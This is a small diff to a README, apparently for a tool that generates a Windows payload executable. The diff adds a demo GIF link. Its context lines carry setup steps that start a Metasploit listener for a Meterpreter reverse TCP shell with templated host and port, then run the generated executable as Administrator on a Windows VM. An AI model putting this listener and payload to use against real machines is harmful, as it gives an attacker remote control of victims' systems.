@@ -56,8 +56,10 @@ msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter
 
 3. Start listener: ```msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {args.LHOST}; set LPORT {args.LPORT}; exploit'```
 4. Run {exe_name} as Administrator on Windows VM
+   
 
-
+# Demo
+![Demo](assets/demo.gif)
 
 # How It Works
 Technical Overview
